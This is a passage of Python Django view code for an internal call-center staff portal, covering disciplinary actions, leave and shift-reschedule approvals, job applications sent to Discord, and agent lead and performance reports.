        agent_profile = Profile.objects.get(user=request.user)
        today_date = today_date
        action_type = data.get('action_type').lower()
        action_reason = data.get('action_reason')
        action_evidence = data.get('action_evidence')
        incident_date = data.get('incident_date')
        action_amount = data.get('action_amount')
        action_status = data.get('action_status').lower()

        if action_amount == '' or action_amount is None or action_amount == "None":
            # action_amount is blank or None, set it to None
            action_amount = 0
        if action_type == "written warning":
            action_type = "warning"

        action = Action.objects.get(id=action_id)
        action.action_type=action_type
        action.reason=action_reason
        action.evidence=action_evidence
        action.deduction_amount=action_amount
        action.status=action_status
        action.handled_by = request.user
        action.save()
        date = datetime.now(timezone('US/Eastern')).date()
        time = datetime.now(timezone('US/Eastern')).time()
        request_ip = request.META.get('REMOTE_ADDR')
        Log.objects.create(request_ip=request_ip,date=date,user=request.user,user_profile=profile,time=time,action=action,log_info="Handled an Action, Action ID: "+str(action.id)+ " Type: "+str(data.get('action_type')) + " Amount: "+str(action_amount))


        action_id = data.get("action_id")
        agent_notified = Action.objects.get(id=action_id).agent
        result = (data.get('action_status')).lower()
        date = datetime.now(timezone('US/Eastern')).date()
        time = datetime.now(timezone('US/Eastern')).time()
        datetime_value = datetime.combine(date, time)
        if action_type == "warning" and result != "pending":
            message = Message.objects.create(date=datetime_value, agent_notified=agent_notified,accuser=request.user,warning=action,
                                                msg_type="warning",result=result)
            
        elif action_type == "deduction" and result != "pending":
            message = Message.objects.create(date=datetime_value, agent_notified=agent_notified,accuser=request.user,deduction=action,
                                    msg_type="deduction",result=result)

        return redirect('/actions-handling')

                                    

    return render(request, "requests-handling/actions_handling_report.html",context)


@login_required(login_url="/login")
def leaves_list_handling(request):

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.leave_handling:
        return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    profile = Profile.objects.get(user=request.user)
    name = profile.full_name        
    
    teams = Team.objects.filter(active=True)
    today_date = datetime.now(timezone('US/Eastern')).date()
    leaves = Leave.objects.filter(status="pending", active=True).order_by('-submission_date')[:20]
    affiliates = AffiliateUser.objects.filter(active=True)
    context = {
               'affiliates':affiliates,
               "profile":profile,
                "teams":teams,
                "requestprofile":profile,
                "leaves":leaves,
                "today_date":today_date,
                "notifications":notifications,
               'messages':messages,
               'permissions':permissions,
               'work_status':work_status,
               }

    return render(request, "requests-handling/leaves_handling_pending.html",context)




@login_required(login_url="/login")
def leaves_handling_search(request):

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.leave_handling:
        return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")

    profile = Profile.objects.get(user=request.user)
    name = profile.full_name        
    
    teams = Team.objects.filter(active=True)
    today_date = datetime.now(timezone('US/Eastern')).date()

    affiliates = AffiliateUser.objects.filter(active=True)

    context = {
                'affiliates':affiliates,
               "profile":profile,
                "teams":teams,
                "requestprofile":profile,
                "today_date":today_date,
                "notifications":notifications,
               'messages':messages,
               'permissions':permissions,
               'work_status':work_status,
               }
    
    if request.method == "POST":
        if 'search_by_name' in request.POST:
            data = request.POST
            start_date=data.get('start_date') 
            end_date=data.get('end_date') 
            approved = data.get('approved')
            rejected = data.get('rejected')
            pending = data.get('pending')

            leaves_results = {
                            "approved": approved,
                            "rejected": rejected,
                            "pending": pending,
                            }
            leaves_results_active = []
            for result in leaves_results:

                if str(leaves_results[result]) == "None":
                    pass
                elif str(leaves_results[result]) == "on":
                    leaves_results_active.append(str(result)) 

            leaves_searched = Leave.objects.filter(status__in=leaves_results_active, submission_date__range=[start_date, end_date], active=True).order_by('-submission_date')
                    
            affiliates = AffiliateUser.objects.filter(active=True)
            context = {
                    'affiliates':affiliates,
                    "profile":profile,
                    "teams":teams,
                    "requestprofile":profile,
                    "leaves":leaves_searched,
                    "today_date":today_date,
                    "notifications":notifications,
                    'messages':messages,
                    'permissions':permissions,
                    'work_status':work_status,
                    }

            return render(request, "requests-handling/leaves_search_results.html",context)
        



    return render(request, "requests-handling/leaves_search.html",context)

@login_required(login_url="/login")
def leave_handling_report(request, leave_id):

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions
    
    if not permissions.leave_handling:
        return redirect("/access-denied")
    
    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")

    profile = Profile.objects.get(user=request.user)
    name = profile.full_name        
    
    teams = Team.objects.filter(active=True)
    today_date = datetime.now(timezone('US/Eastern')).date()
    leave = Leave.objects.get(id=leave_id)

    leave_result_types = ["Approved","Rejected","Pending"]

    affiliates = AffiliateUser.objects.filter(active=True)

    context = {
                'affiliates':affiliates,
               "profile":profile,
                "teams":teams,
                "requestprofile":profile,
                "leave":leave,
                "today_date":today_date,
                "leave_result_types":leave_result_types,
                "notifications":notifications,
               'messages':messages,
               'permissions':permissions,
               'work_status':work_status,
               }
    

    if request.method == "POST":
        data = request.POST
        agent_profile = Profile.objects.get(user=request.user)
        today_date = today_date
        leave_type = data.get('leave_type').lower()
        leave_reason = data.get('leave_reason')
        leave_status = data.get('leave_status').lower()


        leave = Leave.objects.get(id=leave_id)
        leave.leave_type=leave_type
        leave.reason=leave_reason
        leave.status=leave_status
        leave.handled_by = request.user
        leave.save()

        date = datetime.now(timezone('US/Eastern')).date()
        time = datetime.now(timezone('US/Eastern')).time()
        request_ip = request.META.get('REMOTE_ADDR')
        Log.objects.create(request_ip=request_ip,date=date,user=request.user,user_profile=profile,time=time,leave=leave,log_info="Handled a Leave, Action ID: "+str(leave.id)+ " Type: "+str(data.get('leave_type')))


        leave_id = data.get("leave_id")
        agent_notified = Leave.objects.get(id=leave_id).agent
        result = (data.get('leave_status')).lower()
        date = datetime.now(timezone('US/Eastern')).date()
        time = datetime.now(timezone('US/Eastern')).time()
        datetime_value = datetime.combine(date, time)
        if result != "pending":
            message = Notification.objects.create(date=datetime_value,agent_notified=agent_notified,leave=leave,
                                                noti_type="leave",result=result)
        return redirect("/leaves-handling")

                                    

    return render(request, "requests-handling/leaves_handling_report.html",context)





@login_required(login_url="/login")
def reschedule_list_handling(request):

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.reschedule_handling:
        return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    profile = Profile.objects.get(user=request.user)
    name = profile.full_name        
    
    teams = Team.objects.filter(active=True)
    today_date = datetime.now(timezone('US/Eastern')).date()
    reschedules = Shift_Reschedule.objects.filter(status="pending").order_by('-submission_date')[:20]

    affiliates = AffiliateUser.objects.filter(active=True)
    context = {
               'affiliates':affiliates,
               "profile":profile,
                "teams":teams,
                "requestprofile":profile,
                "reschedules":reschedules,
                "today_date":today_date,
                "notifications":notifications,
               'messages':messages,
               'permissions':permissions,
               'work_status':work_status,
               }

    return render(request, "requests-handling/reschedules_handling_pending.html",context)


@login_required(login_url="/login")
def reschedules_handling_search(request):

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.reschedule_handling:
        return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")

    profile = Profile.objects.get(user=request.user)
    name = profile.full_name        
    
    teams = Team.objects.filter(active=True)
    today_date = datetime.now(timezone('US/Eastern')).date()


    affiliates = AffiliateUser.objects.filter(active=True)
    context = {
                'affiliates':affiliates,
               "profile":profile,
                "teams":teams,
                "requestprofile":profile,
                "today_date":today_date,
                "notifications":notifications,
               'messages':messages,
               'permissions':permissions,
               'work_status':work_status,
               }

    if request.method == "POST":
        if 'search_by_name' in request.POST:
            data = request.POST
            start_date=data.get('start_date') 
            end_date=data.get('end_date') 
            approved = data.get('approved')
            rejected = data.get('rejected')
            pending = data.get('pending')

            reschedules_results = {
                            "approved": approved,
                            "rejected": rejected,
                            "pending": pending,
                            }
            reschedules_results_active = []
            for result in reschedules_results:

                if str(reschedules_results[result]) == "None":
                    pass
                elif str(reschedules_results[result]) == "on":
                    reschedules_results_active.append(str(result)) 

            reschedules_searched = Shift_Reschedule.objects.filter(status__in=reschedules_results_active, submission_date__range=[start_date, end_date]).order_by('-submission_date')
            affiliates = AffiliateUser.objects.filter(active=True)
            context = {
                    'affiliates':affiliates,
                    "profile":profile,
                    "teams":teams,
                    "requestprofile":profile,
                    "reschedules":reschedules_searched,
                    "today_date":today_date,
                    "notifications":notifications,
                    'messages':messages,
                    'permissions':permissions,
                    'work_status':work_status,
                    }

            
            return render(request, "requests-handling/reschedules_search_results.html",context)
        



    return render(request, "requests-handling/reschedules_search.html",context)

@login_required(login_url="/login")
def reschedule_handling_report(request, reschedule_id):

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.reschedule_handling:
        return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")

    profile = Profile.objects.get(user=request.user)
    name = profile.full_name        
    
    teams = Team.objects.filter(active=True)
    today_date = datetime.now(timezone('US/Eastern')).date()
    reschedule = Shift_Reschedule.objects.get(id=reschedule_id)

    reschedule_result_types = ["Approved","Rejected","Pending"]

    affiliates = AffiliateUser.objects.filter(active=True)

    context = {
               'affiliates':affiliates,
               "profile":profile,
                "teams":teams,
                "requestprofile":profile,
                "reschedule":reschedule,
                "today_date":today_date,
                "reschedule_result_types":reschedule_result_types,
                "notifications":notifications,
               'messages':messages,
               'permissions':permissions,
               'work_status':work_status,
               }
    

    if request.method == "POST":
        data = request.POST
        agent_profile = Profile.objects.get(user=request.user)
        today_date = today_date
        reschedule_time = data.get("reschedule_time")
        reschedule_reason = data.get('reschedule_reason')
        reschedule_status = data.get('reschedule_status').lower()


        reschedule = Shift_Reschedule.objects.get(id=reschedule_id)
        reschedule.reason=reschedule_reason
        reschedule.status=reschedule_status
        reschedule.handled_by = request.user
        reschedule.save()
        date = datetime.now(timezone('US/Eastern')).date()
        time = datetime.now(timezone('US/Eastern')).time()
        request_ip = request.META.get('REMOTE_ADDR')
        Log.objects.create(request_ip = request_ip, date=date,user=request.user,user_profile=profile,time=time,reschedule=reschedule,log_info="Handled a Shift Reschedule, Reschedule ID: "+str(reschedule.id)+ " Reschedule Time: "+str(data.get('reschedule_time')))

        reschedule_id = data.get("reschedule_id")
        agent_notified = Shift_Reschedule.objects.get(id=reschedule_id).agent
        result = (data.get('reschedule_status')).lower()
        date = datetime.now(timezone('US/Eastern')).date()
        time = datetime.now(timezone('US/Eastern')).time()
        datetime_value = datetime.combine(date, time)
        if result != "pending":
            message = Notification.objects.create(date=datetime_value,agent_notified=agent_notified,reschedule=reschedule,
                                                noti_type="reschedule",result=result)
            if result == "approved":
                agent_profile.login_time = reschedule_time
                agent_profile.save()
        return redirect("/reschedules-handling")

                                    

    return render(request, "requests-handling/reschedules_handling_report.html",context)


@login_required(login_url="/login")
def action_handled_report(request, action_id):

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions


    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")

    profile = Profile.objects.get(user=request.user)
    name = profile.full_name        
    
    teams = Team.objects.filter(active=True)
    today_date = datetime.now(timezone('US/Eastern')).date()
    action = Action.objects.get(id=action_id)
    action_agent = User.objects.get(username=action.agent)

    if request.user != action_agent or action.status == "pending" or action.status == "rejected":
        return redirect('/access-denied')
    if  action.action_type == "warning" and request.user == action_agent:
        msg = Message.objects.get(warning=action)
        msg.read = True
        msg.save()
    elif  action.action_type == "deduction" and request.user == action_agent:
        msg = Message.objects.get(deduction=action)
        msg.read = True
        msg.save()

    action_result_types = ["Approved","Rejected",]

    affiliates = AffiliateUser.objects.filter(active=True)
    context = {
               'affiliates':affiliates,
               "profile":profile,
               "requestprofile":profile,
                "teams":teams,
                "action":action,
                "today_date":today_date,
                "action_result_types":action_result_types,
                "notifications":notifications,
               'messages':messages,
               'permissions':permissions,
               'work_status':work_status,
               }
    
                                
    return render(request, "requests-handling/action_handled_report.html",context)

@login_required(login_url="/login")
def referral_form(request):


    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.referral:
        return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"

    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    

    
    teams = Team.objects.filter(active=True)
    requestprofile = Profile.objects.get(user=request.user)
    
    affiliates = AffiliateUser.objects.filter(active=True)
    context = {
               'affiliates':affiliates,
               'teams': teams,
               'requestprofile':requestprofile,
               'notifications':notifications,
               'messages':messages,
               'permissions':permissions,
               'work_status':work_status,
               }

    if request.method == "POST":
        data = request.POST
        agent = request.user
        position = data.get("position_types")
        full_name = data.get("full_name")
        email = data.get("email")
        phone = data.get("phone")
        education = (data.get("education")).lower()
        experience = data.get("experience")
        shift = data.get("shift")
        start_date = data.get('start_date')
        voice_link = data.get('voice_link')
        position_discord = position 
        shift_discord = shift
        if position == "Cold Caller":
            position = "cold_caller"
        elif position == "Acquisition Manager":
            position = "acq_manager"
        elif position == "Disposition Manager":
            position = "dispo_manager"
        elif position == position == "Data Manager":
            position = "data_manager"
        
        if shift == "Full-time (8 Hours)":
            shift = "full_time"
        elif shift == "Part-time (4 Hours)":
            shift = "part_time"
        date = datetime.now(timezone('US/Eastern')).date()
        time = datetime.now(timezone('US/Eastern')).time()
        app = Application.objects.create(date=date,time=time,agent=agent, position=position,
                                      full_name=full_name, email=email,
                                      phone=phone, education=education,
                                      experience=experience, shift=shift, start_date=start_date, voice_record=voice_link)
        request_ip = request.META.get('REMOTE_ADDR')
        Log.objects.create(request_ip=request_ip,date=date,user=request.user,user_profile=profile,time=time,refferral=app,log_info="Added a Refferral, Reschedule ID: "+str(app.id))
        
        mention1 = f'<@979421026976927785>'
        mention2 = f'<@979390450865688596>'
        utc_now = datetime.utcnow()

        # Get the timezone object for 'America/New_York'
        est_timezone = pytz.timezone('America/New_York')

        # Convert UTC time to Eastern timezone
        est_time = utc_now.replace(tzinfo=pytz.utc).astimezone(est_timezone)

        # Format the time as HH:MM:SS string
        est = est_time.strftime('%I:%M:%S %p')

        # Construct the content of the embed with quote formatting
        request_ip = request.META.get('REMOTE_ADDR')

        content = f'\n**REFERRAL**\n\n\n**Referrer:** {profile.full_name}\n\n**Applicant:** {full_name}\n\n**Position:** {position_discord}\n\n**Can Start on:** {start_date}\n\n**Shift:** {shift_discord}\n\n**Eastern:** {est}\n\n**IP Address:** {request_ip} \n\n {mention1} - {mention2} '
        try:
            send_discord_message_application(content,app.id)
        except:
            pass
        return redirect("/login")


    return render(request, 'applications/referral_form.html', context)

def application_form(request):

    
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    context = {'name':"Guest",
               }

    if request.method == "POST":
        data = request.POST
        position = data.get("position_types")
        full_name = data.get("full_name")
        email = data.get("email")
        phone = data.get("phone")
        education = (data.get("education")).lower()
        experience = data.get("experience")
        shift = data.get("shift")
        start_date = data.get('start_date')
        voice_link = data.get('voice_link')
        position_discord = position
        shift_discord = shift
        if position == "Cold Caller":
            position = "cold_caller"
        elif position == "Acquisition Manager":
            position = "acq_manager"
        elif position == "Disposition Manager":
            position = "dispo_manager"
        elif position == position == "Data Manager":
            position = "data_manager"
        
        if shift == "Full-time (8 Hours)":
            shift = "full_time"
        elif shift == "Part-time (4 Hours)":
            shift = "part_time"
        date = datetime.now(timezone('US/Eastern')).date()
        time = datetime.now(timezone('US/Eastern')).time()
        app = Application.objects.create(date=date,time=time,position=position,
                                      full_name=full_name, email=email,
                                      phone=phone, education=education,
                                      experience=experience, shift=shift, voice_record=voice_link, start_date=start_date)
        
        mention1 = f'<@979421026976927785>'
        mention2 = f'<@979390450865688596>'
        utc_now = datetime.utcnow()

        # Get the timezone object for 'America/New_York'
        est_timezone = pytz.timezone('America/New_York')

        # Convert UTC time to Eastern timezone
        est_time = utc_now.replace(tzinfo=pytz.utc).astimezone(est_timezone)

        # Format the time as HH:MM:SS string
        est = est_time.strftime('%I:%M:%S %p')

        # Construct the content of the embed with quote formatting
        request_ip = request.META.get('REMOTE_ADDR')

        content = f'\n**APPLICATION**\n\n\n**Applicant:** {full_name}\n\n**Position:** {position_discord}\n\n**Can Start on:** {start_date}\n\n**Shift:** {shift_discord}\n\n**Eastern:** {est}\n\n**IP Address:** {request_ip} \n\n {mention1} - {mention2} '
        try:
            send_discord_message_application(content,app.id)
        except:
            pass
        return redirect("https://nedialo.com")


    return render(request, 'applications/apply.html', context)

@login_required(login_url="/login")
def leads_dashboard(request):
    
    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions
 
    if not permissions.leads_dashboard:
        return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"

    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    requestprofile = Profile.objects.get(user=request.user)

    
    teams = Team.objects.filter(active=True)
    requestprofile = Profile.objects.get(user=request.user)
    


    date = datetime.now(timezone('US/Eastern')).date()
    datem = int(date.strftime("%m"))
    month_name = calendar.month_name[datem]
    agents = Profile.objects.filter(role="coldcaller", active=True)
    agents_leads = {}
    for agent in agents:
        agents_leads[agent] = [0,0,0,0,0,0,0]
        leads = Lead_Submission.objects.filter(agent=agent.user,pushed_date__month=datem)
        for lead in leads:
            agents_leads[agent][0] +=1
            if lead.lead_status == "qualified":
               agents_leads[agent][1] +=1
            elif lead.lead_status == "disqualified":
               agents_leads[agent][2] +=1

            elif lead.lead_status == "callback":
               agents_leads[agent][3] +=1
            elif lead.lead_status == "duplicate":
               agents_leads[agent][4] +=1
            elif lead.lead_status == "pending":
               agents_leads[agent][5] +=1    
    for agent in agents_leads:
        try:
            total_leads = agents_leads[agent][1] + agents_leads[agent][2]
            agents_leads[agent][6] = (100*(agents_leads[agent][1])) / total_leads
        except:
            if agents_leads[agent][2] ==0 and agents_leads[agent][1] != 0:
                agents_leads[agent][6] = 100
            elif agents_leads[agent][1] == 0:
                agents_leads[agent][6] = 0
            else:
                agents_leads[agent][6] = 0
    affiliates = AffiliateUser.objects.filter(active=True)
    context = {
               'affiliates':affiliates,
               'teams': teams,
               'requestprofile':requestprofile,
               'notifications':notifications,
               'messages':messages,
               'month_name':month_name,
               'leads':leads,
               'agents_leads':agents_leads,
               'permissions':permissions,
               'work_status':work_status,
               }
    
    return render(request, 'lead_forms/leads_dashboard.html', context)


@login_required(login_url="/login")
def agents_performance(request):

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.agents_agent_performance:
        return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"

    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    

    
    teams = Team.objects.filter(active=True)
    requestprofile = Profile.objects.get(user=request.user)
    


    datem = int(datetime.today().strftime("%m"))
    month_name = calendar.month_name[datem]
    affiliates = AffiliateUser.objects.filter(active=True)


    """agents = Performance.objects.filter(active=True)



    callers = Profile.objects.filter(role="coldcaller", active=True)
    agents_leads_all = []

    for agent in callers:
        date = datetime.now(timezone('US/Eastern')).date()
        datem = int(date.strftime("%m"))
        actions = Action.objects.filter(agent=agent.user,status="approved",active=True, submission_date__month=datem)
        healthscore = Performance.objects.get(agent=agent.user, active=True)
        healthscore.health = len(actions)
        healthscore.save()
        agents_leads = [0,0,0]
        leads = Lead_Submission.objects.filter(agent=agent.user,pushed_date__month=datem)
        
        for lead in leads:
            if lead.lead_status == "qualified":
               agents_leads[0] +=1
            elif lead.lead_status == "disqualified":
               agents_leads[1] +=1
        agents_leads_all.append(agents_leads)
    for agent in agents_leads_all:
        try:
            total_leads = agent[0] + agent[1]
            agent[2] = int((100*(agent[0])) / total_leads)
        except:
            if agent[1] ==0 and agent[0] != 0:
                agent[2] = 100
            elif agent[0] == 0:
                agent[2] = 0
            else:
                agent[2] = 0

    list1 = agents
    list2 = agents_leads_all
    # Using list comprehension and zip
    result = [[x, y] for x, y in zip(list1, list2)]"""

    callers = Profile.objects.filter(role="coldcaller", active=True)

    agents_perf = {}

    # Iterate through each caller
    for agent in callers:
        date = datetime.now(timezone('US/Eastern')).date()
        datem = int(date.strftime("%m"))

        # Filter actions for the current month
        actions = Action.objects.filter(agent=agent.user, status="approved", active=True, submission_date__month=datem)

        # Get or create performance object
        performance = Performance.objects.get(agent=agent.user, active=True)

        # Update the health of the performance
        performance.health = len(actions)
        performance.save()

        # Initialize leads counter [qualified, disqualified, performance score]
        agents_leads = [0, 0, 0]

        # Filter leads for the current month
        leads = Lead_Submission.objects.filter(agent=agent.user, pushed_date__month=datem)

        # Count leads by status
        for lead in leads:
            if lead.lead_status == "qualified":
                agents_leads[0] += 1
            elif lead.lead_status == "disqualified":
                agents_leads[1] += 1

        agents_perf[performance] = agents_leads

    # Calculate performance score
    for agent, leads in agents_perf.items():
        try:
            total_leads = leads[0] + leads[1]
            if total_leads > 0:
                agents_perf[agent][2] = int((100 * leads[0]) / total_leads)
            else:
                agents_perf[agent][2] = 0
        except ZeroDivisionError:
            agents_perf[agent][2] = 0

    context = {
               'affiliates':affiliates,
               'teams': teams,
               'requestprofile':requestprofile,
               'notifications':notifications,
               'messages':messages,
               'month_name':month_name,
                #'agents':result,
                'agents_perf':agents_perf,
                'permissions':permissions,
                'work_status':work_status,
               }
    
    return render(request, 'agents/agents_performance.html', context)




@login_required(login_url="/login")
def performance_report(request,id):
    context = {}

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.agents_agent_performance:
        return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"

    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    requestprofile = Profile.objects.get(user=request.user)


    
    
    
    teams = Team.objects.filter(active=True)
    requestprofile = Profile.objects.get(user=request.user)
    

    try:
        agent_performance = Performance.objects.get(id=id,active=True)

        adherence = agent_performance.adherence
        quality = agent_performance.quality
        #health_object = int(agent_performance.health)
        date = datetime.now(timezone('US/Eastern')).date()
        datem = int(date.strftime("%m"))
        actions = Action.objects.filter(agent=agent_performance.agent,status="approved",active=True, submission_date__month=datem)
        health_object = len(actions)
    except:
        adherence = 100
        quality = 100
        leadse = 100
    try:
        agent = Profile.objects.get(user=agent_performance.agent)
    except:
        return redirect('/not-found')
    date = datetime.now(timezone('US/Eastern')).date()
    datem = int(date.strftime("%m"))

    agent_leads = [0,0,0]
    leads = Lead_Submission.objects.filter(agent=agent.user,pushed_date__month=datem)
    for lead in leads:
        if lead.lead_status == "qualified":
            agent_leads[0] +=1
        elif lead.lead_status == "disqualified":
            agent_leads[1] +=1

    try:
        total_leads = agent_leads[0] + agent_leads[1]
        agent_leads[2] = (100*(agent_leads[0])) / total_leads
    except:
        if agent_leads[1] ==0 and agent_leads[0] != 0:
            agent_leads[2] = 100
        elif agent_leads[0] == 0:
            agent_leads[2] = 0
        else:
            agent_leads[2] = 0
    leads = int(agent_leads[2])


    if request.method == "POST":
        data = request.POST
        adherence = data.get("adherence")
        quality = data.get("quality")
        user = agent_performance.agent
        agent_perf = Performance.objects.get(agent=user) 
        agent_perf.adherence = adherence
        agent_perf.quality = quality
        agent_perf.save()

        date = datetime.now(timezone('US/Eastern')).date()
        time = datetime.now(timezone('US/Eastern')).time()
        request_ip = request.META.get('REMOTE_ADDR')
        Log.objects.create(request_ip=request_ip, date=date,user=request.user,user_profile=profile,time=time,agent_performance=agent_perf,log_info="Modified Agent Performance, Performance Report ID: "+str(agent_perf.id))

        return redirect("/agents-performance") 
    affiliates = AffiliateUser.objects.filter(active=True)       
    context = { 
                'affiliates':affiliates,
                'teams': teams,
                'requestprofile':requestprofile,
                'profile':agent,
                'agent':agent_performance,
                'health':health_object,
                'leads':leads,
                'notifications':notifications,
                'messages':messages,
                'permissions':permissions,
                'work_status':work_status,
                }
    return render(request, "agents/performance_report.html", context)



@login_required(login_url="/login")
def feedback_report(request,id):
    context = {}

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.agents_agent_performance:
        return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"

    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    date = datetime.now(timezone('US/Eastern')).date()
    time = datetime.now(timezone('US/Eastern')).time()
    teams = Team.objects.filter(active=True)
    requestprofile = Profile.objects.get(user=request.user)
    agent = Profile.objects.get(userid=id)


    feedbacks = Feedback.objects.filter(active=True, agent_profile=agent).order_by('-date')[:5]
    affiliates = AffiliateUser.objects.filter(active=True)       
    if request.method == "POST":
        if 'today_report' in request.POST:
            data = request.POST
            agentuser = data.get('agent')
            agent_fed = User.objects.get(username=agentuser)
            agent_prof = Profile.objects.get(user=agent_fed)

            try:
                feedback = Feedback.objects.get(date=date, active=True)
            except:
                feedback = Feedback.objects.create(date=date, time=time, agent_user=agent_fed,
                                                agent_profile=agent_prof,editor_user=request.user,editor_profile=Profile.objects.get(user=request.user))


            context = { 
                    'affiliates':affiliates,
                    'teams': teams,
                    'requestprofile':requestprofile,
                    'agent':agent,
                    'notifications':notifications,
                    'messages':messages,
                    'permissions':permissions,
                    'work_status':work_status,
                    'feedback':feedback,
                    }
            return render(request,'agents/agent_feedback_report.html',context )

        elif 'save_feedback' in request.POST:
            data = request.POST
            feedback_id = data.get('feedback_id')
            lead_writing_rating = data.get('lead_writing_rating')
            lead_writing_fb = data.get('lead_writing_fb')

            tonality_rating = data.get('tonality_rating')
            tonality_fb = data.get('tonality_fb')

            rapid_call_response_rating = data.get('rapid_call_response_rating')
            rapid_call_response_fb = data.get('rapid_call_response_fb')

            active_listening_rating = data.get('active_listening_rating')
            active_listening_fb = data.get('active_listening_fb')

            effective_questioning_rating = data.get('effective_questioning_rating')
            effective_questioning_fb = data.get('effective_questioning_fb')
            english_proficiency_rating = data.get('english_proficiency_rating')
            english_proficiency_fb = data.get('english_proficiency_fb')

            background_noise_rating = data.get('background_noise_rating')
            background_noise_fb = data.get('background_noise_fb')

            objection_handling_rating = data.get('objection_handling_rating')
            objection_handling_fb = data.get('objection_handling_fb')

            conclusion = data.get('conclusion')
            checked = data.get('check')     
            publish = False   
            if checked == "on":
                publish = True

            feedback = Feedback.objects.get(id=feedback_id)
            
            feedback.lead_writing_rating = int(lead_writing_rating)
            feedback.lead_writing_fb = lead_writing_fb
            feedback.tonality_rating = int(tonality_rating)
            feedback.tonality_fb = tonality_fb
